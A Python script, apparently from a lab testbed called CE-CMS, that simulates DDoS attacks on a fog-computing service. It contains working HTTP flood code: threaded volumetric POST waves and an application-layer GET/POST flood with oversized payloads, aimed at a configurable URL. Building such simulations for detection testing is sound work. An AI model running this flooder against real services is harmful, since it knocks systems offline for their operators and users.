#!/usr/bin/env python3
"""
CE-CMS DDoS Flood Attack Simulation
Simulates distributed denial of service attacks on fog layer
"""

import json
import time
import random
import requests
import threading
import logging
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor

logger = logging.getLogger(__name__)

class DDoSFlooder:
    """Simulates DDoS flood attacks"""
    
    def __init__(self, target_urls):
        self.fog_url = target_urls.get('fog', 'http://fog:6000')
        self.device_url = target_urls.get('device', 'http://device:5000')
        self.attack_active = False
        self.attack_stats = {
            "packets_sent": 0,
            "requests_per_second": 0,
            "attack_duration": 0,
            "source_ips_used": 0
        }
        
        # Botnet simulation
        self.botnet_ips = self._generate_botnet_ips(100)
        
    def _generate_botnet_ips(self, count):
        """Generate fake botnet IP addresses"""
        ips = []
        for _ in range(count):
            ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            ips.append(ip)
        return ips
    
    def generate_flood_packet(self, source_ip):
        """Generate DDoS flood packet"""
        packet_types = ["udp_flood", "tcp_syn_flood", "http_flood", "amplification"]
        packet_type = random.choice(packet_types)
        
        packet = {
            "packet_id": f"ddos_{packet_type}_{int(time.time() * 1000000)}",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "source_ip": source_ip,
            "destination_ip": "192.168.100.1",  # Fog layer IP
            "packet_type": packet_type,
            "size": random.randint(64, 1500),
            "protocol": random.choice(["TCP", "UDP", "ICMP"]),
            "flags": ["SYN"] if packet_type == "tcp_syn_flood" else [],
            "payload": "A" * random.randint(100, 1000),  # Junk data
            "malicious": True,
            "attack_type": "ddos_flood"
        }
        
        return packet
    
    def send_flood_wave(self, source_ip, packets_per_wave=10):
        """Send a wave of flood packets from single IP"""
        packets_sent = 0
        
        for _ in range(packets_per_wave):
            try:
                packet = self.generate_flood_packet(source_ip)
                
                # Send to fog layer
                response = requests.post(
                    f"{self.fog_url}/device_data",
                    json=packet,
                    timeout=1  # Short timeout to overwhelm
                )
                
                packets_sent += 1
                self.attack_stats["packets_sent"] += 1
                
            except requests.exceptions.RequestException:
                # Expected during successful DDoS
                packets_sent += 1
                self.attack_stats["packets_sent"] += 1
            except Exception as e:
                logger.debug(f"Flood packet error: {e}")
        
        return packets_sent
    
    def launch_volumetric_attack(self, duration=60, intensity="high"):
        """Launch volumetric DDoS attack"""
        if self.attack_active:
            return {"status": "attack_already_active"}
        
        self.attack_active = True
        
        # Set intensity parameters
        intensity_params = {
            "low": {"threads": 10, "packets_per_wave": 5, "wave_delay": 0.5},
            "medium": {"threads": 25, "packets_per_wave": 10, "wave_delay": 0.2},
            "high": {"threads": 50, "packets_per_wave": 20, "wave_delay": 0.1},
            "extreme": {"threads": 100, "packets_per_wave": 50, "wave_delay": 0.05}
        }
        
        params = intensity_params.get(intensity, intensity_params["high"])
        
        logger.warning(f"Launching volumetric DDoS attack - Intensity: {intensity}")
        
        def attack_coordinator():
            start_time = time.time()
            
            with ThreadPoolExecutor(max_workers=params["threads"]) as executor:
                while time.time() - start_time < duration and self.attack_active:
                    # Select random IPs from botnet
                    selected_ips = random.sample(self.botnet_ips, min(params["threads"], len(self.botnet_ips)))
                    
                    # Launch concurrent flood waves
                    futures = []
                    for ip in selected_ips:
                        future = executor.submit(self.send_flood_wave, ip, params["packets_per_wave"])
                        futures.append(future)
                    
                    # Wait for wave completion
                    for future in futures:
                        try:
                            future.result(timeout=2)
                        except:
                            pass
                    
                    # Calculate current RPS
                    elapsed = time.time() - start_time
                    if elapsed > 0:
                        self.attack_stats["requests_per_second"] = self.attack_stats["packets_sent"] / elapsed
                    
                    time.sleep(params["wave_delay"])
            
            self.attack_stats["attack_duration"] = time.time() - start_time
            self.attack_stats["source_ips_used"] = len(set(self.botnet_ips))
            self.attack_active = False
            
            logger.info(f"Volumetric DDoS attack completed. Packets sent: {self.attack_stats['packets_sent']}")
        
        threading.Thread(target=attack_coordinator, daemon=True).start()
        
        return {
            "status": "attack_launched",
            "intensity": intensity,
            "duration": duration,
            "estimated_pps": params["threads"] * params["packets_per_wave"] / params["wave_delay"]
        }
    
    def launch_application_layer_attack(self, duration=60):
        """Launch application layer DDoS attack"""
        if self.attack_active:
            return {"status": "attack_already_active"}
        
        self.attack_active = True
        logger.warning("Launching application layer DDoS attack")
        
        def app_layer_attack():
            start_time = time.time()
            
            # Target specific endpoints
            endpoints = [
                "/device_data",
                "/network_status", 
                "/traffic_stats",
                "/health"
            ]
            
            while time.time() - start_time < duration and self.attack_active:
                try:
                    # Select random endpoint and IP
                    endpoint = random.choice(endpoints)
                    source_ip = random.choice(self.botnet_ips)
                    
                    # Create application-specific attack
                    if endpoint == "/device_data":
                        # Send massive fake device data
                        fake_data = self._create_massive_device_data(source_ip)
                        requests.post(f"{self.fog_url}{endpoint}", json=fake_data, timeout=1)
                    else:
                        # HTTP GET flood
                        requests.get(f"{self.fog_url}{endpoint}", timeout=1)
                    
                    self.attack_stats["packets_sent"] += 1
                    
                except:
                    self.attack_stats["packets_sent"] += 1  # Count failed attempts too
                
                time.sleep(0.01)  # Very high frequency
            
            self.attack_active = False
            logger.info("Application layer DDoS attack completed")
        
        threading.Thread(target=app_layer_attack, daemon=True).start()
        
        return {"status": "attack_launched", "type": "application_layer", "duration": duration}
    
    def _create_massive_device_data(self, source_ip):
        """Create oversized device data payload"""
        # Create massive sensor array
        sensors = []
        for i in range(100):  # 100 fake sensors
            sensors.append({
                "sensor_type": f"fake_sensor_{i}",
                "data": {
                    "values": [random.random() for _ in range(1000)],  # Large data array
                    "metadata": "X" * 10000  # Large metadata
                }
            })
        
        return {
            "packet_id": f"massive_packet_{int(time.time() * 1000000)}",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "device_info": {
                "device_id": f"fake_device_{source_ip.replace('.', '_')}",
                "device_type": "massive_sensor_array"
            },
            "sensors": sensors,
            "malicious": True,
            "attack_type": "application_layer_ddos"
        }
    
    def stop_attack(self):
        """Stop DDoS attack"""
        if not self.attack_active:
            return {"status": "no_active_attack"}
        
        self.attack_active = False
        return {"status": "attack_stopped"}
    
    def get_attack_stats(self):
        """Get attack statistics"""
        return {
            "attack_active": self.attack_active,
            "statistics": self.attack_stats,
            "botnet_size": len(self.botnet_ips)
        }

if __name__ == "__main__":
    import os
    
    target_urls = {
        'fog': os.getenv('FOG_URL', 'http://localhost:6000'),
        'device': os.getenv('DEVICE_URL', 'http://localhost:5000')
    }
    
    flooder = DDoSFlooder(target_urls)
    
    print("Starting DDoS flood attack simulation...")
    
    # Launch volumetric attack
    result = flooder.launch_volumetric_attack(duration=30, intensity="high")
    print(f"Volumetric attack launched: {result}")
    
    time.sleep(35)
    
    # Launch application layer attack
    result2 = flooder.launch_application_layer_attack(duration=20)
    print(f"Application layer attack launched: {result2}")
    
    time.sleep(25)
    
    stats = flooder.get_attack_stats()
    print(f"Final attack stats: {stats}")